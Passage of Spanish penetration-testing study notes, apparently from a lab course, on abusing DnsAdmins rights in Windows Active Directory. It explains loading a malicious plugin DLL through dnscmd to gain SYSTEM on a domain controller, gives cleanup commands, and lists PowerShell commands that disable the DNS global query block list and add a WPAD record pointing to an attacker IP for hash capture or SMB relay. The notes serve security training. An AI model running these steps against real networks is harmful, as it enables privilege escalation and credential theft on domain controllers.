
Tienen acceso a la informacion de DNS de la red. El servicio DNS de Windows permite usar plugins que se usa para resolver consultas que no estan en el ambito de ninguna zona DNS local

El servicio DNS se ejecuta como NT AUTHORITY\SYSTEM

[dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd): podemos usar esta herramienta para especificar la ruta de los DLL del plugin

Cadena de ataque cuando DNS se ejecuta en un DC:

- La gestion DNS se realiza sobre RPC
- ServerLevelPluginDLL nos permite cargar una DLL personalizada sin ninguna verificacion de la ruta del DLL usando `dnscmd`
- Cuando un miembro de `DnsAdmins` ejecuta `dnscmd` se rellena el hive key "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPlugin"
- Cuando se reinicia el serivicio DNS se carga el DLL en esta ruta (este es un recurso compartido al que la cuenta maquina de DC tiene acceso)
- Un atacante puede cargar una DLL personalizada con un reverse shell o cargar alguna herramienta como Mimikatz

## Limpieza

Cambiar la configuracion y reinciar el DNS son acciones destructivas

Estos pasos se deberan hacer con una cuenta elevada

1. Confirmando que la hive key fue agregada. Comprobamos que `ServerLevelPluginDll` existe. Tendremos que eliminar nuestra DLL para que incie el servicio DNS correctamente:

```
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```
![[Pasted image 20260910164714.png]]

2. Eliminando `ServerLevelPluginDll` hive key:

```
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```
![[Pasted image 20260910164748.png]]

3. Iniciando el servicio DNS de nuevo:

```
sc.exe start dns
```
![[Pasted image 20260910164812.png]]

4. Verificando el estado del serivicio DNS

```
sc query dns
```
![[Pasted image 20260910164841.png]]

## Creando un registro WPAD

DNSAdmins no da la posibilidad de deshabilitar la seguridad de la lista de bloqueos de consultas globales que por defecto bloquearia este ataque

Tras deshabilitar la lista de bloqueo de consultas globales y crear un registro WPAD, cada maquina que ejecuta WPAD con la configuracion predeterminada tendra su trafico dirigido a traves de un proxy en nuestra maquina de ataque

Usaremos [Responder](https://github.com/lgandx/Responder) o [Inveigh](https://github.com/Kevin-Robertson/Inveigh) para realizar el spoofing del trafico. Con esto podremos capturar hashes o realizar un SMBRelay

1. Deshabilitamos la lista de bloqueo de consultas globales

```
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

2. Agregamos un registro WPAD

```
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```
